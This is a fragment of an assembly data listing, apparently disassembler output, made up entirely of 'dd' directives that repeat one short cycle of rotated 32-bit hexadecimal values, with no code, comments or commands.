		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
